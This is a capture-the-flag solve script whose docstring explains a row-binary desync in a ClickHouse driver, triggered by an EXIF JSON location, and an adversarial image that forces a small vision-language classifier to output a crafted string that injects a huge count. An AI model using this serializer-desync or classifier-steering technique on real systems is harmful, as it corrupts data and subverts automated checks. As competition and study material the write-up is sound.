#!/usr/bin/env python3
"""
Ein milljon bjora - one-shot exploit.

Bug chain:
  1. Backend reads the beer photo's location from an EXIF UserComment JSON blob
     {"location":{"x":..,"y":..}}. Exif.ReadLocation returns the *JsonElement*
     itself as the `location` object (not a Tuple like the GPS path does).
  2. That JsonElement is handed straight to ClickHouse.Driver's RowBinary
     serializer as the value for the `location Point` column. PointType extends
     TupleType, whose Write() only handles ITuple or IList. A JsonElement is
     neither -> it writes ZERO bytes for the Point column.
  3. This desyncs the RowBinary stream. The row the driver emits is:
        (Point:0 bytes) 01 00 00 00        # amount UInt32 = 1
        <varint len> <classification utf8> # String
        01                                 # approved Bool
     ClickHouse re-parses it as [Point:16][amount:4][String:var][Bool:1], so the
     server reads its 16-byte Point out of {amount + start of classification},
     then reads `amount` out of classification bytes [11:15], and the String
     length out of classification byte [15].
  4. For a clean single-row parse the classification S (len L, L<128) must satisfy
        S[15] == chr(L-16)
     and then injected amount = little-endian uint32(S[11:15]).
     For the crafted answer "this is a beer  cold golden lager brew tasty yum"
     (L=48, S[15]=' '=chr(32)) the injected amount is uint32(b'eer ') = 544367973,
     which is >> the 1,000,000 goal, so ONE approved insert reveals the flag.
  5. The classifier is a deterministic (greedy) nanoVLM-230M. final.jpg is an
     adversarial image (built by adv.py) that forces the model to emit exactly
     that 48-byte string. final.jpg already carries the EXIF location blob.

Requirement: a rate-limit token must be available so `approved` is true (fresh
instance has 100 tokens; the first upload is approved).

Usage:  python solve.py https://<instance-host>
"""
import sys, requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:3000"
IMG  = sys.argv[2] if len(sys.argv) > 2 else "final.jpg"

data = open(IMG, "rb").read()
r = requests.post(BASE + "/api/beers",
                  files={"photo": ("photo.jpg", data, "image/jpeg")}, timeout=300)
print("POST /api/beers ->", r.status_code, r.text[:300])

s = requests.get(BASE + "/api/stats", timeout=60).json()
print("counted =", s.get("counted"), "/ goal", s.get("goal"),
      "| approved", s.get("approved"), "rejected", s.get("rejected"))
print("FLAG:", s.get("flag"))
